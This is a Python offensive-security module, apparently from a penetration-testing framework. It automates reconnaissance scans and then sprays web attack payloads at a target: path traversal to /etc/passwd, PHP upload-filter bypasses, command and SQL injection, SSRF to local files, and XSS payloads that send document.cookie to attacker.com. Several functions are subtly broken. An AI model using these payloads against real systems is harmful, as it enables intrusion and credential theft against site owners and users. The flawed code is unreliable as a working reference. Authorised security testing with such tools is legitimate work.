#!/usr/bin/env python3
import subprocess
import os
import json
import requests
import dns.resolver
import whois
import socket
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

class WebExploitManager:
    def __init__(self, target, logger):
        self.target = target
        self.logger = logger
        self.domain = self._resolve_domain()
        
    def _resolve_domain(self):
        """Resolve domain from IP and add to /etc/hosts"""
        try:
            # Check if target is an IP address
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', self.target):
                # Run nmap to get domain information
                nmap_cmd = f"nmap -sV -sC -p389,636,3268,3269 {self.target}"
                nmap_result = subprocess.run(nmap_cmd.split(), capture_output=True, text=True)
                
                domains = set()
                # Try to get domain from reverse DNS
                try:
                    domain = socket.gethostbyaddr(self.target)[0]
                    domains.add(domain)
                except socket.herror:
                    pass
                
                # Extract domain from nmap results
                if nmap_result.stdout:
                    # Look for domain patterns in LDAP service information
                    domain_patterns = [
                        r'Domain: ([^,]+)',
                        r'Domain: ([^\.]+)',
                        r'Domain: ([^\s]+)'
                    ]
                    
                    for pattern in domain_patterns:
                        matches = re.findall(pattern, nmap_result.stdout)
                        for match in matches:
                            # Clean up domain name
                            domain = match.strip().lower()
                            if domain:
                                domains.add(domain)
                
                # If no domains found, use a generated domain
                if not domains:
                    domain = f"target-{self.target.replace('.', '-')}.local"
                    domains.add(domain)
                
                # Add all domains to /etc/hosts
                hosts_entries = []
                for domain in domains:
                    hosts_entry = f"{self.target} {domain}"
                    hosts_entries.append(hosts_entry)
                
                # Write to /etc/hosts
                with open('/etc/hosts', 'a') as f:
                    f.write("\n# Added by PenTest Framework\n")
                    for entry in hosts_entries:
                        f.write(f"{entry}\n")
                        self.logger.success(f"Added domain resolution: {entry}")
                
                return list(domains)[0]  # Return first domain as primary
            return self.target
        except Exception as e:
            self.logger.error(f"Failed to resolve domain: {str(e)}")
            return self.target

    def _format_url(self, path=""):
        """Format URL with proper protocol and path"""
        # Ensure target has protocol
        if not self.target.startswith(('http://', 'https://')):
            # Try HTTPS first
            try:    
                requests.get(f"https://{self.target}", verify=False, timeout=5)
                base_url = f"https://{self.target}"
            except:
                base_url = f"http://{self.target}"
        
        # Ensure path starts with /
        if path and not path.startswith('/'):
            path = '/' + path
            
        return f"{base_url}{path}"

    def test_path_traversal(self, paths_to_try=None):
        """Test for path traversal vulnerabilities (seen in Strutted)"""
        if not paths_to_try:
            paths_to_try = [
                "../../../etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "....\/....\/....\/etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%c1%9c..%c1%9c..%c1%9cetc/passwd"
            ]
        
        results = {}
        for path in paths_to_try:
            try:
                url = self._format_url(path)
                response = requests.get(url, verify=False)
                if self._is_path_traversal_successful(response):
                    results[path] = True
                    self.logger.success(f"Path traversal successful with: {path}")
                else:
                    results[path] = False
            except Exception as e:
                self.logger.error(f"Error testing path traversal with {path}: {str(e)}")
                results[path] = False
        
        return results
    
    def test_file_upload_bypass(self, extensions_to_try=None):
        """Test for file upload restriction bypasses (seen in Strutted, BigBang)"""
        if not extensions_to_try:
            extensions_to_try = [
                ".php", ".phtml", ".php5", ".php7", ".phar", ".pgif", 
                ".php.jpg", ".php%00.jpg", ".php.", ".php%00", ".php%0a",
                ".php%0d%0a", ".php%0a%0d", ".php%0d", ".php%0a",
                ".php%00", ".php%00.", ".php%00.jpg", ".php%00.png",
                ".php%00.gif", ".php%00.jpeg", ".php%00.bmp"
            ]
        
        results = {}
        for ext in extensions_to_try:
            try:
                payload = self._create_test_file(ext)
                response = self._upload_file(payload)
                if self._is_upload_successful(response):
                    results[ext] = True
                    self.logger.success(f"Upload bypass successful with: {ext}")
                else:
                    results[ext] = False
            except Exception as e:
                self.logger.error(f"Error testing file upload with {ext}: {str(e)}")
                results[ext] = False
        
        return results
        
    def test_command_injection(self, parameters=None):
        """Test for command injection vulnerabilities (seen in TwoMillion, BigBang)"""
        if not parameters:
            parameters = ["cmd", "exec", "command", "ping", "query", "jump", "code", "input", "file", "path"]
            
        payloads = [
            ";id;", 
            "| id", 
            "$(id)", 
            "`id`", 
            "&& id", 
            "%0Aid",
            "|| id",
            "& id",
            "| id |",
            "`id`;",
            "$(id);",
            "& id &",
            "| id &",
            "& id |",
            "| id ||",
            "|| id |",
            "| id &&",
            "&& id |"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    response = requests.get(f"{self.target}?{param}={payload}", verify=False)
                    if self._is_command_injection_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"Command injection successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing command injection with {param}={payload}: {str(e)}")
                    
        return results

    def test_sql_injection(self, parameters=None):
        """Test for SQL injection vulnerabilities"""
        if not parameters:
            parameters = ["id", "user", "username", "password", "email", "search", "query"]
            
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3#",
            "' UNION SELECT 1,2,3/*",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_sql_injection_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"SQL injection successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing SQL injection with {param}={payload}: {str(e)}")
                    
        return results

    def test_xss(self, parameters=None):
        """Test for Cross-Site Scripting vulnerabilities"""
        if not parameters:
            parameters = ["search", "q", "query", "s", "input", "message", "comment"]
            
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_xss_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"XSS successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing XSS with {param}={payload}: {str(e)}")
                    
        return results

    def test_ssrf(self, parameters=None):
        """Test for Server-Side Request Forgery vulnerabilities"""
        if not parameters:
            parameters = ["url", "path", "src", "dest", "redirect", "proxy", "rurl"]
            
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",
            "http://localhost:80",
            "http://127.0.0.1:80",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://localhost:11211/",
            "gopher://localhost:11211/_"
        ]
        
        results = {}
        for param in parameters:
            for payload in payloads:
                try:
                    url = self._format_url(f"?{param}={payload}")
                    response = requests.get(url, verify=False)
                    if self._is_ssrf_successful(response):
                        results[f"{param}:{payload}"] = True
                        self.logger.success(f"SSRF successful with: {param}={payload}")
                except Exception as e:
                    self.logger.error(f"Error testing SSRF with {param}={payload}: {str(e)}")
                    
        return results

    def _is_path_traversal_successful(self, response):
        """Check if path traversal was successful"""
        success_indicators = [
            "root:x:",
            "/bin/bash",
            "/etc/shadow",
            "daemon:x:",
            "nobody:x:",
            "www-data:x:",
            "/bin/sh",
            "/bin/false",
            "/usr/sbin/nologin"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _is_sql_injection_successful(self, response):
        """Check if SQL injection was successful"""
        success_indicators = [
            "SQL syntax",
            "mysql_fetch_array",
            "mysql_fetch_assoc",
            "mysql_fetch_row",
            "mysql_num_rows",
            "mysql_result",
            "mysql_query",
            "mysql_error",
            "ORA-",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "Warning: mysql_",
            "valid MySQL result",
            "check the manual that corresponds to your (MySQL|MariaDB) server version",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Npgsql.",
            "Microsoft SQL Server",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "com.microsoft.sqlserver.jdbc.SQLServerException",
            "System.Data.SqlClient.SqlException",
            "Warning: mssql_",
            "valid MSSQL result"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _is_xss_successful(self, response):
        """Check if XSS was successful"""
        return any(payload in response.text for payload in [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>"
        ])

    def _is_ssrf_successful(self, response):
        """Check if SSRF was successful"""
        success_indicators = [
            "root:x:",
            "[boot loader]",
            "default=multi",
            "default=0",
            "timeout=5",
            "splashimage",
            "hiddenmenu",
            "prompt",
            "password",
            "username",
            "user",
            "pass",
            "auth",
            "login",
            "admin",
            "administrator"
        ]
        return any(indicator in response.text for indicator in success_indicators)

    def _create_test_file(self, extension):
        """Create a test file with the given extension"""
        content = "<?php phpinfo(); ?>"
        filename = f"test{extension}"
        with open(filename, 'w') as f:
            f.write(content)
        return filename

    def _upload_file(self, filename):
        """Upload a file to the target"""
        with open(filename, 'rb') as f:
            files = {'file': f}
            url = self._format_url('/upload')
            return requests.post(url, files=files, verify=False)

    def _is_upload_successful(self, response):
        """Check if file upload was successful"""
        return response.status_code == 200 and "success" in response.text.lower()

    def _is_command_injection_successful(self, response):
        """Check if command injection was successful"""
        success_indicators = [
            "uid=",
            "gid=",
            "groups=",
            "root:x:"
        ]
        return any(indicator in response.text for indicator in success_indicators)

class InformationGathering:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None, use_headers=False, custom_headers=None):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.use_headers = use_headers
        self.custom_headers = custom_headers or {
            "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
            "Accept": "*/*"
        }
        self.findings = {
            "osint": {},
            "infrastructure": {},
            "services": {},
            "hosts": {},
            "web_vulnerabilities": {}  # New section for web vulnerabilities
        }
        self.output_dir = f"reports/info_gathering_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Initialize WebExploitManager
        self.web_exploit_manager = WebExploitManager(target, logger)

    def _get_header_string(self):
        """Get header string for command line tools"""
        if not self.use_headers:
            return ""
        header_str = " ".join([f"--header='{k}: {v}'" for k, v in self.custom_headers.items()])
        return header_str

    def run(self):
        """Run all information gathering tasks"""
        self.logger.info("Starting Information Gathering phase...")
        
        # 1. Open Source Intelligence (OSINT)
        self.logger.info("Performing OSINT gathering...")
        self.findings["osint"] = self.run_osint()
        
        # 2. Infrastructure Enumeration
        self.logger.info("Performing infrastructure enumeration...")
        self.findings["infrastructure"] = self.run_infrastructure_enumeration()
        
        # 3. Service Enumeration
        self.logger.info("Performing service enumeration...")
        self.findings["services"] = self.run_service_enumeration()
        
        # 4. Host Enumeration
        self.logger.info("Performing host enumeration...")
        self.findings["hosts"] = self.run_host_enumeration()
        
        # 5. Web Vulnerability Testing
        self.logger.info("Testing for web vulnerabilities...")
        self.findings["web_vulnerabilities"] = self.test_web_vulnerabilities()
        
        # Save findings to JSON for other stages
        self._save_findings()
        
        return self.findings

    def _save_findings(self):
        """Save findings to JSON file for use in other stages"""
        output_file = f"{self.output_dir}/findings.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
        self.logger.info(f"Findings saved to {output_file}")

    def run_command(self, command, capture_output=True):
        """Run a system command and return the output"""
        if self.tool_manager:
            return self.tool_manager.run_tool(command.split()[0], command, capture_output)
        else:
            try:
                result = subprocess.run(command.split(), capture_output=capture_output, text=True)
                if result.returncode != 0:
                    self.logger.error(f"Command failed: {result.stderr}")
                    return None
                return result.stdout
            except Exception as e:
                self.logger.error(f"Error executing command: {str(e)}")
                return None

    def run_osint(self):
        """Perform OSINT gathering"""
        self.logger.info("Starting OSINT gathering...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            # Basic WHOIS and DNS checks first
            self.execution_engine.add_task("whois", self.run_command, f"whois {self.target}", priority=1)
            self.execution_engine.add_task("dns", self.run_command, f"dig +short {self.target}", priority=2)
            
            # Run initial tasks
            initial_results = self.execution_engine.run_parallel()
            self.findings["osint"].update(initial_results)
            
            # Clear tasks for next batch
            self.execution_engine.clear_tasks()
            
            # More intensive scans if initial checks succeed
            if initial_results.get("dns"):
                self.execution_engine.add_task("subfinder", self.run_command, 
                    f"subfinder -d {self.target} -silent -t 100", priority=3)
                self.execution_engine.add_task("amass", self.run_command, 
                    f"amass enum -passive -d {self.target} -timeout 5", priority=4)
                self.execution_engine.add_task("theharvester", self.run_command, 
                    f"theHarvester -d {self.target} -b all -l 100", priority=5)
                
                # Run secondary tasks
                secondary_results = self.execution_engine.run_parallel()
                self.findings["osint"].update(secondary_results)
        else:
            # Fallback to sequential execution with timeouts
            self.findings["osint"]["whois"] = self.run_command(f"whois {self.target}")
            self.findings["osint"]["dns"] = self.run_command(f"dig +short {self.target}")
            
            if self.findings["osint"].get("dns"):
                self.findings["osint"]["subfinder"] = self.run_command(
                    f"subfinder -d {self.target} -silent -t 100")
                self.findings["osint"]["amass"] = self.run_command(
                    f"amass enum -passive -d {self.target} -timeout 5")
                self.findings["osint"]["theharvester"] = self.run_command(
                    f"theHarvester -d {self.target} -b all -l 100")

    def run_infrastructure_enumeration(self):
        """Perform infrastructure enumeration"""
        self.logger.info("Starting infrastructure enumeration...")
        
        # Step 1: Fast port scan with -p- and high rate
        self.logger.info("Running initial fast port scan...")
        initial_scan_cmd = f"nmap -p- --min-rate 10000 {self.target}"
        initial_scan_result = self.run_command(initial_scan_cmd)
        
        if not initial_scan_result:
            self.logger.error("Initial port scan failed")
            return {}
            
        # Save initial scan results
        with open(f"{self.output_dir}/initial_scan.txt", 'w') as f:
            f.write(initial_scan_result)
            
        # Parse open ports from initial scan
        open_ports = []
        for line in initial_scan_result.split('\n'):
            if '/tcp' in line and 'open' in line:
                port = line.split('/')[0].strip()
                open_ports.append(port)
                
        if not open_ports:
            self.logger.warning("No open ports found in initial scan")
            return {}
            
        # Step 2: Detailed scan on discovered ports
        self.logger.info("Running detailed scan on discovered ports...")
        ports_str = ','.join(open_ports)
        detailed_scan_cmd = f"nmap -sVC -A -p{ports_str} {self.target}"
        detailed_scan_result = self.run_command(detailed_scan_cmd)
        
        if not detailed_scan_result:
            self.logger.error("Detailed scan failed")
            return {}
            
        # Save detailed scan results
        with open(f"{self.output_dir}/detailed_scan.txt", 'w') as f:
            f.write(detailed_scan_result)
            
        return {
            "initial_scan": initial_scan_result,
            "detailed_scan": detailed_scan_result
        }

    def run_service_enumeration(self):
        """Perform service enumeration"""
        self.logger.info("Starting service enumeration...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            header_str = self._get_header_string()
            self.execution_engine.add_task("whatweb", self.run_command, 
                f"whatweb -v {header_str} {self.target}", priority=1)
            
            # Run all tasks in parallel
            results = self.execution_engine.run_parallel()
            self.findings["services"] = results
        else:
            # Fallback to sequential execution
            header_str = self._get_header_string()
            self.findings["services"]["whatweb"] = self.run_command(
                f"whatweb -v {header_str} {self.target}")

    def run_host_enumeration(self):
        """Perform host enumeration"""
        self.logger.info("Starting host enumeration...")
        
        # Add tasks to execution engine if available
        if self.execution_engine:
            # Quick OS detection first
            self.execution_engine.add_task("nmap_os", self.run_command, 
                f"nmap -O --osscan-limit --max-os-tries 1 -T4 {self.target}", priority=1)
            
            # Run OS detection
            os_results = self.execution_engine.run_parallel()
            self.findings["hosts"].update(os_results)
            
            # Clear tasks for next batch
            self.execution_engine.clear_tasks()
            
            # Vulnerability scan only if OS detection succeeded
            if os_results.get("nmap_os"):
                self.execution_engine.add_task("nmap_vuln", self.run_command, 
                    f"nmap --script vuln --script-timeout 2m -T4 {self.target}", priority=2)
                
                # Run vulnerability scan
                vuln_results = self.execution_engine.run_parallel()
                self.findings["hosts"].update(vuln_results)
        else:
            # Fallback to sequential execution
            self.findings["hosts"]["nmap_os"] = self.run_command(
                f"nmap -O --osscan-limit --max-os-tries 1 -T4 {self.target}")
            
            if self.findings["hosts"].get("nmap_os"):
                self.findings["hosts"]["nmap_vuln"] = self.run_command(
                    f"nmap --script vuln --script-timeout 2m -T4 {self.target}")

    def osint_gathering(self):
        """Perform Open Source Intelligence gathering"""
        results = {}
        
        # 1. WHOIS Information
        self.logger.info("Gathering WHOIS information...")
        try:
            whois_info = whois.whois(self.target)
            results["whois"] = whois_info
        except Exception as e:
            self.logger.error(f"WHOIS lookup failed: {str(e)}")
        
        # 2. DNS Enumeration
        self.logger.info("Performing DNS enumeration...")
        dns_records = self._enumerate_dns()
        results["dns"] = dns_records
        
        # 3. Subdomain Enumeration
        self.logger.info("Enumerating subdomains...")
        subdomains = self._enumerate_subdomains()
        results["subdomains"] = subdomains
        
        # 4. Social Media and Web Presence
        self.logger.info("Checking social media and web presence...")
        web_presence = self._check_web_presence()
        results["web_presence"] = web_presence
        
        return results

    def _enumerate_dns(self):
        """Enumerate DNS records"""
        results = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target, record_type)
                results[record_type] = [str(rdata) for rdata in answers]
            except Exception as e:
                self.logger.error(f"DNS {record_type} lookup failed: {str(e)}")
                
        return results

    def _enumerate_subdomains(self):
        """Enumerate subdomains using various tools"""
        results = {}
        
        # Using subfinder
        self.logger.info("Running subfinder...")
        subfinder_cmd = f"subfinder -d {self.target} -o {self.output_dir}/subfinder.txt"
        subfinder_result = self.run_command(subfinder_cmd)
        if subfinder_result:
            results["subfinder"] = subfinder_result
            
        # Using amass
        self.logger.info("Running amass...")
        amass_cmd = f"amass enum -passive -d {self.target} -o {self.output_dir}/amass.txt"
        amass_result = self.run_command(amass_cmd)
        if amass_result:
            results["amass"] = amass_result
            
        return results

    def _check_web_presence(self):
        """Check web presence and social media"""
        results = {}
        
        # Using theHarvester
        self.logger.info("Running theHarvester...")
        harvester_cmd = f"theHarvester -d {self.target} -b all -l 500 -o {self.output_dir}/harvester.txt"
        harvester_result = self.run_command(harvester_cmd)
        if harvester_result:
            results["harvester"] = harvester_result
            
        return results

    def infrastructure_enumeration(self):
        """Enumerate infrastructure information"""
        results = {}
        
        # 1. Network Range Discovery
        self.logger.info("Discovering network ranges...")
        network_info = self._discover_network_ranges()
        results["network_ranges"] = network_info
        
        # 2. ASN Information
        self.logger.info("Gathering ASN information...")
        asn_info = self._gather_asn_info()
        results["asn"] = asn_info
        
        # 3. Cloud Infrastructure Detection
        self.logger.info("Detecting cloud infrastructure...")
        cloud_info = self._detect_cloud_infrastructure()
        results["cloud"] = cloud_info
        
        return results

    def _discover_network_ranges(self):
        """Discover network ranges"""
        results = {}
        
        # Using nmap for network discovery
        self.logger.info("Running nmap network discovery...")
        nmap_cmd = f"nmap -sn {self.target}/24 -oN {self.output_dir}/network_discovery.txt"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _gather_asn_info(self):
        """Gather ASN information"""
        results = {}
        
        # Using asnlookup
        self.logger.info("Running asnlookup...")
        asn_cmd = f"asnlookup -o {self.output_dir}/asn.txt {self.target}"
        asn_result = self.run_command(asn_cmd)
        if asn_result:
            results["asnlookup"] = asn_result
            
        return results

    def _detect_cloud_infrastructure(self):
        """Detect cloud infrastructure"""
        results = {}
        
        # Using cloudlist
        self.logger.info("Running cloudlist...")
        cloud_cmd = f"cloudlist -d {self.target} -o {self.output_dir}/cloud.txt"
        cloud_result = self.run_command(cloud_cmd)
        if cloud_result:
            results["cloudlist"] = cloud_result
            
        return results

    def service_enumeration(self):
        """Enumerate services"""
        results = {}
        
        # 1. Port Scanning
        self.logger.info("Performing port scanning...")
        port_scan = self._perform_port_scan()
        results["ports"] = port_scan
        
        # 2. Service Version Detection
        self.logger.info("Detecting service versions...")
        service_versions = self._detect_service_versions()
        results["versions"] = service_versions
        
        # 3. Web Technology Detection
        self.logger.info("Detecting web technologies...")
        web_tech = self._detect_web_technologies()
        results["web_tech"] = web_tech
        
        return results

    def _perform_port_scan(self):
        """Perform comprehensive port scanning"""
        results = {}
        
        # Using nmap for port scanning
        self.logger.info("Running nmap port scan...")
        nmap_cmd = f"nmap -p- -sV -sC -oN {self.output_dir}/port_scan.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        # Using masscan for quick port scanning
        self.logger.info("Running masscan...")
        masscan_cmd = f"masscan {self.target} -p1-65535 --rate=1000 -oJ {self.output_dir}/masscan.json"
        masscan_result = self.run_command(masscan_cmd)
        if masscan_result:
            results["masscan"] = masscan_result
            
        return results

    def _detect_service_versions(self):
        """Detect service versions"""
        results = {}
        
        # Using nmap service detection
        self.logger.info("Running nmap service detection...")
        nmap_cmd = f"nmap -sV -sC -oN -A {self.output_dir}/service_versions.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _detect_web_technologies(self):
        """Detect web technologies"""
        results = {}
        
        # Using whatweb
        self.logger.info("Running whatweb...")
        header_str = self._get_header_string()
        whatweb_cmd = f"whatweb -v {header_str} {self.target} -o {self.output_dir}/whatweb.txt"
        whatweb_result = self.run_command(whatweb_cmd)
        if whatweb_result:
            results["whatweb"] = whatweb_result
            
        # Using wappy
        self.logger.info("Running wappy...")
        wappy_cmd = f"wappy  -u {self.target} -wf {self.output_dir}/wappy.txt"
        wappy_result = self.run_command(wappy_cmd)
        if wappy_result:
            results["wappy"] = wappy_result
            
        return results

    def host_enumeration(self):
        """Enumerate host information"""
        results = {}
        
        # 1. Operating System Detection
        self.logger.info("Detecting operating system...")
        os_info = self._detect_os()
        results["os"] = os_info
        
        # 2. Host Discovery
        self.logger.info("Performing host discovery...")
        host_info = self._discover_hosts()
        results["hosts"] = host_info
        
        # 3. Vulnerability Scanning
        self.logger.info("Performing vulnerability scanning...")
        vuln_info = self._scan_vulnerabilities()
        results["vulnerabilities"] = vuln_info
        
        return results

    def _detect_os(self):
        """Detect operating system"""
        results = {}
        
        # Using nmap OS detection
        self.logger.info("Running nmap OS detection...")
        nmap_cmd = f"nmap -O -oN {self.output_dir}/os_detection.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _discover_hosts(self):
        """Discover hosts"""
        results = {}
        
        # Using nmap host discovery
        self.logger.info("Running nmap host discovery...")
        nmap_cmd = f"nmap -sn -PR -PS22,25,80,443,3389 -PA21,23,80,3389 -PE -PP -oN {self.output_dir}/host_discovery.txt {self.target}/24"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def _scan_vulnerabilities(self):
        """Scan for vulnerabilities"""
        results = {}
        
        # Using nmap vulnerability scripts
        self.logger.info("Running nmap vulnerability scripts...")
        nmap_cmd = f"nmap -sV --script vuln -oN {self.output_dir}/vulnerability_scan.txt {self.target}"
        nmap_result = self.run_command(nmap_cmd)
        if nmap_result:
            results["nmap"] = nmap_result
            
        return results

    def test_web_vulnerabilities(self):
        """Test for web vulnerabilities"""
        results = {
            "path_traversal": self.web_exploit_manager.test_path_traversal(),
            "file_upload_bypass": self.web_exploit_manager.test_file_upload_bypass(),
            "command_injection": self.web_exploit_manager.test_command_injection(),
            "sql_injection": self.web_exploit_manager.test_sql_injection(),
            "xss": self.web_exploit_manager.test_xss(),
            "ssrf": self.web_exploit_manager.test_ssrf()
        }
        return results 